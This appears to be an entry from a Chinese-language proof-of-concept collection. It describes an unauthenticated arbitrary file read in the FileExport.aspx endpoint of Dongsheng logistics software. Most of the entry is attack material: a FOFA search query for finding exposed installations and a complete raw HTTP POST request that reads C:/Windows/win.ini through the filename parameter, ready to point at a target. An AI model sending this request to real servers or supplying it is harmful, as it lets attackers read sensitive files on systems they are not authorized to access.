## 东胜物流软件-FileExport.aspx-任意文件读取漏洞

## 一、漏洞简介
东胜物流软件 FileExport.aspx 接囗处存在任意文件读取漏洞,未经身份验证的远程攻击者通过漏洞可以获取到服务器敏感信息，导致系统处于极不安全的状态。

## fofa
```
app="东胜物流软件-物流软件"
```

## POC
```
POST /Reports/FileExport.aspx HTTP/1.1
Host: [目标服务器地址]
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.6,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 31
Connection: close

filename=C:/Windows/win.ini
```
